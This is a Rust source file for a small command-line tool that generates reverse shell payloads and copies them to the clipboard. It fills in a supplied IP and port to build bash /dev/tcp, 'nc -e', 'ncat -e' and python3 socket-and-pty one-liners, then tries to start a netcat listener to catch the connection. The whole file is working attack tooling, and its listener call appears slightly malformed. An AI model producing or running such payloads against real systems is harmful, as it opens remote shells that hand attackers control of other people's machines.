use arboard::Clipboard;
use structopt::StructOpt;
use strum::VariantNames;
use strum_macros::{EnumString, EnumVariantNames};
use std::process::Command;

#[derive(Debug, EnumString, EnumVariantNames)]
#[strum(serialize_all = "kebab_case")]
enum Commands {
    Bash,
    Nc,
    Ncat,
    Python3,
}

#[derive(Debug, EnumString, EnumVariantNames)]
#[strum(serialize_all = "kebab_case")]
enum Shells {
    Bash,
    Sh,
    Cmd,
}

#[derive(Debug, StructOpt)]
#[structopt(
    name = "Rev Shell Gen",
    about = "Reverse shell generator in the terminal"
)]
struct Options {
    #[structopt(short, long)]
    ip: String,

    #[structopt(short, long)]
    port: u16,

    #[structopt(short, long, possible_values = &Commands::VARIANTS)]
    command: Commands,

    #[structopt(short, long, possible_values = &Shells::VARIANTS)]
    shell: Shells,

    #[structopt(short, long, help = "Toggle flag to not deploy a reverse shell listener")]
    reverse_shell: bool,
}

fn main() {
    // Generate payload and paste into system clipboard
    let mut clipboard = Clipboard::new().unwrap();
    let options = Options::from_args();

    let shell_string = match options.shell {
        Shells::Bash => "/bin/bash",
        Shells::Sh => "/bin/sh",
        Shells::Cmd => "cmd",
    };

    let payload = match options.command {
        Commands::Bash => format!("{} >& /dev/tcp/{}/{} 0>&1", shell_string, options.ip, options.port),
        Commands::Nc => format!("nc {} {} -e {}", options.ip, options.port, shell_string),
        Commands::Ncat => format!("ncat {} {} -e {}", options.ip, options.port, shell_string),
        Commands::Python3 => format!("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{}\")'", options.ip, options.port, shell_string)
    };

    println!("{}", payload);
    clipboard.set_text(payload).unwrap();
    println!("Payload has been copied into system clipboard!");

    // Start reverse shell
    if !options.reverse_shell {
        match Command::new("nc")
            .arg(format!("-lvnp {}", options.port))
            .output()
        {
            Ok(_) => (),
            Err(_) => println!("Failed to start reverse shell. Maybe Netcat is not installed?"),
        }
    }
}
